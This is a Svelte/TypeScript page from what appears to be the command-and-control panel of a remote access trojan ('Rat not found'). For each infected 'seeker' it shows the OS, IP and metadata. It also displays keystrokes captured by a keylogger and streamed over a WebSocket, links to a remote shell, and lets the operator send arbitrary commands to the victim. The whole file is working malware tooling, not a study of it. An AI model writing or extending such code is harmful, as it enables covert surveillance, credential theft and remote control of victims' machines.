<script lang="ts">
	import { page } from '$app/stores';
	import { onMount } from 'svelte';
	import type { Seeker } from '$lib/types';
	import { writable } from 'svelte/store';

	let seeker: Seeker | null = null;
	let ws: WebSocket | null = null;
	let messageType = '';
	let messageData = '';
	const connected = writable(false);
	const keylogs = writable<string[]>([]);
	let displayLimit = writable('100');

	const limitOptions = ['10', '50', '100', 'all'];

	function decodeHtml(html: string): string {
		const txt = document.createElement('textarea');
		txt.innerHTML = html;
		return txt.value;
	}

	function parseKeylogs(keylogsString: string): string[] {
		const result: string[] = [];
		let current = '';
		let inTag = false;

		for (let i = 0; i < keylogsString.length; i++) {
			const char = keylogsString[i];
			if (char === '<') {
				if (current) result.push(current);
				current = char;
				inTag = true;
			} else if (char === '>' && inTag) {
				current += char;
				result.push(current);
				current = '';
				inTag = false;
			} else if (!inTag && char !== '<') {
				if (current) result.push(current);
				result.push(char);
				current = '';
			} else {
				current += char;
			}
		}
		if (current) result.push(current);
		return result;
	}

	$: if (seeker?.keylogs) {
		const decoded = decodeHtml(seeker.keylogs);
		keylogs.set(parseKeylogs(decoded));
	}

	$: displayedKeylogs = $displayLimit === 'all' ? $keylogs : $keylogs.slice(-parseInt($displayLimit));

	async function setSeeker(id: string) {
		const res = await fetch(`/api/seekers`);
		if (!res.ok) {
			console.error('Fetch error:', res.status, res.statusText);
			return;
		}
		const seekers: Record<string, Seeker> = await res.json();
		seeker = seekers[id] ?? null;

        displayedKeylogs = [seeker.keylogs];
        
		connected.set(!seeker?.disconnected);
	}

	function sendMessage() {
		if (ws?.readyState === WebSocket.OPEN) {
			const message = {
				type: messageType,
				data: messageData
			};
			ws.send(JSON.stringify(message));
		} else {
			console.warn('WebSocket not connected.');
		}
	}

	onMount(() => {
		const id = $page.params.id;
		setSeeker(id);

		ws = new WebSocket(`ws://localhost:8080/ws/frontend/${id}`);

		ws.onopen = () => connected.set(true);
		ws.onclose = () => connected.set(false);

		ws.onmessage = async (event) => {
			console.log('Message from server:', event.data);
			try {
				const message = JSON.parse(event.data);
				switch (message.type) {
					case 'SeekerConnected':
						if (message.data === id) {
							console.log('Seeker connected.');
							await setSeeker(id);
							connected.set(true);
						}
						break;
					case 'SeekerReconnected':
						if (message.data === id) {
							console.log('Seeker reconnected.');
							await setSeeker(id);
							connected.set(true);
						}
						break;
					case 'SeekerDisconnected':
						if (message.data === id) {
							console.log('Seeker disconnected.');
							connected.set(false);
						}
						break;
					case 'keylogger_keys':
						if (seeker) {
							const decoded = decodeHtml(message.data as string);
							seeker.keylogs += decoded;
							keylogs.set(parseKeylogs(seeker.keylogs));
						}
						break;
					default:
						console.warn('Unknown message type:', message.type);
				}
			} catch (err) {
				console.error('Failed to parse message:', err);
			}
		};

		return () => {
			ws?.close();
		};
	});
</script>

{#if seeker}
	<div class="p-6 bg-gray-800 rounded shadow-lg space-y-6">
		<h2 class="text-3xl font-semibold text-white">{seeker.name}</h2>
		<div class="text-gray-300">
			<p><strong>ID:</strong> {seeker.id}</p>
			<p><strong>OS:</strong> {seeker.os}</p>
			<p><strong>IP:</strong> {seeker.ip}</p>
		</div>
		<div class="mt-4">
			<a
				href="/{seeker.id}/shell"
				class="inline-block px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-500 transition"
			>
				Open Shell
			</a>
		</div>
		<h3 class="text-xl text-white">Metadata</h3>
		<pre
			class="bg-gray-900 text-sm text-gray-200 p-4 rounded overflow-auto max-h-64">{JSON.stringify(
				seeker.metadata,
				null,
				2
			)}</pre>

		<div class="mt-6 p-4 bg-gray-700 rounded space-y-4">
			<div class="flex justify-between items-center">
				<h4 class="text-lg font-medium text-white">Keystrokes</h4>
				<div class="flex items-center gap-2">
					<label for="keylog-limit" class="text-sm text-gray-300">Show last:</label>
					<select
						id="keylog-limit"
						bind:value={$displayLimit}
						class="bg-gray-800 text-white border border-gray-600 rounded px-2 py-1 focus:outline-none focus:ring focus:border-blue-400"
					>
						{#each limitOptions as option}
							<option value={option}>{option === 'all' ? 'All' : option}</option>
						{/each}
					</select>
				</div>
			</div>
			<div class="bg-gray-900 p-4 rounded max-h-64 overflow-y-auto">
				{#if displayedKeylogs.length > 0}
					<div class="flex flex-wrap gap-2">
						{#each displayedKeylogs as key}
							<span
								class="inline-block px-2 py-1 bg-blue-600 text-white text-sm rounded"
							>
								{key}
							</span>
						{/each}
					</div>
				{:else}
					<p class="text-gray-400 text-sm">No keystrokes recorded.</p>
				{/if}
			</div>
		</div>

		<div class="mt-6 p-4 bg-gray-700 rounded space-y-2">
			<h4 class="text-lg font-medium text-white">Send WebSocket Message</h4>
			<div class="flex flex-col gap-2">
				<input
					bind:value={messageType}
					type="text"
					placeholder="Type"
					class="px-3 py-2 rounded bg-gray-800 text-white border border-gray-600 focus:outline-none focus:ring focus:border-blue-400"
				/>
				<input
					bind:value={messageData}
					type="text"
					placeholder="Data"
					class="px-3 py-2 rounded bg-gray-800 text-white border border-gray-600 focus:outline-none focus:ring focus:border-blue-400"
				/>
				<button
					on:click={sendMessage}
					class="bg-green-600 hover:bg-green-500 text-white px-4 py-2 rounded transition"
				>
					Send Message
				</button>
			</div>
			<p class="text-sm text-gray-400 mt-2">Status: {$connected ? 'Connected' : 'Disconnected'}</p>
		</div>
	</div>
{:else}
	<p class="text-gray-300">Rat not found.</p>
{/if}

<style>
	::-webkit-scrollbar {
		width: 8px;
	}
	::-webkit-scrollbar-track {
		background: #1f2937;
	}
	::-webkit-scrollbar-thumb {
		background: #4b5563;
		border-radius: 4px;
	}
	::-webkit-scrollbar-thumb:hover {
		background: #6b7280;
	}
</style>